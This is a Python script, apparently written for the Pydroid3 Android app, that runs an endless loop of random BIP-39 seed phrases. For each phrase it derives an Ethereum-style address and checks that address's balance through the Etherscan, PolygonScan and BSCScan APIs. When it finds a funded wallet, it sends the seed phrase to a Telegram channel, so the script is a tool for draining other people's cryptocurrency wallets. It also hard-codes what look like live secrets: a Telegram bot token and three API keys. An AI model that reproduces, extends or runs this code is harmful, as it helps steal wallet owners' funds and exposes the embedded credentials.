#!/usr/bin/env python3
"""
Pydroid3‐Runnable Telegram Bot (with continuous logging of mnemonics):
Continuously generates 12-word BIP-39 seed phrases, derives the corresponding
Ethereum/Polygon/BSC addresses, checks each for any non-zero balance via
their respective Scan APIs, and if a funded address is found, sends the phrase
and address details to the specified Telegram channel.

This version prints every iteration’s 12-word phrase, address, and zero‐balance
status, so you’ll always see new output in the terminal.

Before running:
    1. In Pydroid3’s terminal, run:
       pip install mnemonic eth-account requests
    2. Make sure this script is saved (e.g. as bot.py) and then execute:
       python3 bot.py
"""

import time
import requests
from mnemonic import Mnemonic
from eth_account import Account

# ─────────────────────────────────────────────────────────────────────────────
# ─── ENABLE UNAUDITED HD WALLET FEATURES ─────────────────────────────────────
Account.enable_unaudited_hdwallet_features()
# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# ─── CONFIGURATION ───────────────────────────────────────────────────────────
BOT_TOKEN           = "7409312087:AAG5Xkr_CGi2owTl0mSsYLwOS0pFstdDfuA"
CHANNEL_USERNAME    = "@TR_PayOutChannel"  # Bot must be admin of this channel

ETHERSCAN_API_KEY   = "3P3TBVE7D9ZVV3X4V96KY6E26CUBTI34MU"
POLYGONSCAN_API_KEY = "G7AJKWM75JRHEBDBJQHCPU24RJBDBNETEV"
BSCSCAN_API_KEY     = "5P3QYVT5R8E1KTRIVHQ68EB13WM3X1YDQ3"

MAX_ITERATIONS      = None     # None = infinite loop; or set to an integer to limit
REQUEST_DELAY       = 0.25     # Delay (in seconds) between each Scan API call
# ─────────────────────────────────────────────────────────────────────────────


def generate_mnemonic() -> str:
    """
    Generate a random 12-word BIP-39 mnemonic (English wordlist).
    """
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=128)


def mnemonic_to_eth_address(mnemonic: str, derivation_path: str = "m/44'/60'/0'/0/0") -> str:
    """
    Derive the Ethereum‐style address from a given BIP-39 mnemonic.
    Default derivation path: m/44'/60'/0'/0/0
    """
    acct = Account.from_mnemonic(mnemonic, account_path=derivation_path)
    return acct.address


def get_balance_scan(chain: str, address: str) -> int:
    """
    Check the native‐coin balance (in Wei) for the given address on the specified chain.
    chain: one of "eth", "poly", "bsc".
    Returns integer Wei balance. Raises on error if API returns a failure.
    """
    if chain == "eth":
        base_url = "https://api.etherscan.io/api"
        api_key  = ETHERSCAN_API_KEY
    elif chain == "poly":
        base_url = "https://api.polygonscan.com/api"
        api_key  = POLYGONSCAN_API_KEY
    elif chain == "bsc":
        base_url = "https://api.bscscan.com/api"
        api_key  = BSCSCAN_API_KEY
    else:
        raise ValueError(f"Unsupported chain: {chain}")

    params = {
        "module": "account",
        "action": "balance",
        "address": address,
        "tag": "latest",
        "apikey": api_key
    }

    resp = requests.get(base_url, params=params, timeout=10)
    resp.raise_for_status()
    data = resp.json()

    if data.get("status") != "1":
        raise RuntimeError(f"{chain.upper()}Scan API Error: {data.get('message')} / {data.get('result')}")

    return int(data["result"])


def send_to_telegram(text: str) -> None:
    """
    Send a text message to the configured Telegram channel via Bot API.
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHANNEL_USERNAME,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        r.raise_for_status()
    except Exception as e:
        print(f"[Telegram Error] {e}")


def main():
    print("🔄 Starting mnemonic generator & balance checker...")
    count = 0

    try:
        while True:
            # If MAX_ITERATIONS is set (e.g. 1000) and we've reached it, exit
            if MAX_ITERATIONS is not None and count >= MAX_ITERATIONS:
                break

            # 1. Generate a new random 12-word mnemonic
            mnemonic = generate_mnemonic()

            # 2. Derive the Ethereum‐style address
            try:
                address = mnemonic_to_eth_address(mnemonic)
            except Exception as e:
                print(f"[{count:06d} Derivation Error] {e}")
                count += 1
                continue

            # 3. Check balances on ETH, Polygon, and BSC
            balances = {}
            for chain in ("eth", "poly", "bsc"):
                try:
                    bal_wei = get_balance_scan(chain, address)
                except Exception:
                    # On API error (rate-limit, etc.), treat as zero for now
                    bal_wei = 0
                balances[chain] = bal_wei
                time.sleep(REQUEST_DELAY)

            # 4. Print every iteration’s mnemonic, address, and zero‐balance status
            eth_w, poly_w, bsc_w = balances["eth"], balances["poly"], balances["bsc"]
            print(
                f"[{count:06d}] Phrase: '{mnemonic}'\n"
                f"           Address: {address}\n"
                f"           Balances → ETH={eth_w/10**18:.6f}, "
                f"MATIC={poly_w/10**18:.6f}, BNB={bsc_w/10**18:.6f}\n"
            )

            # 5. If any chain has a non-zero balance, send details to Telegram
            funded_chains = {k: v for k, v in balances.items() if v > 0}
            if funded_chains:
                msg_lines = [
                    "💰 *FUND FOUND!*",
                    f"Mnemonic Phrase:\n```\n{mnemonic}\n```",
                    f"Address: `{address}`",
                    "",
                    "Balances:"
                ]
                for c, w in funded_chains.items():
                    human = w / 10**18
                    sym = {"eth": "ETH", "poly": "MATIC", "bsc": "BNB"}[c]
                    msg_lines.append(f"- {sym}: `{human:.6f}` ({w} Wei)")
                message = "\n".join(msg_lines)

                print(f"[FOUND @{count:06d}] {address} → {funded_chains}")
                send_to_telegram(message)

            count += 1

    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting…")

    print(f"✅ Checked {count} addresses. Stopping.")


if __name__ == "__main__":
    main()
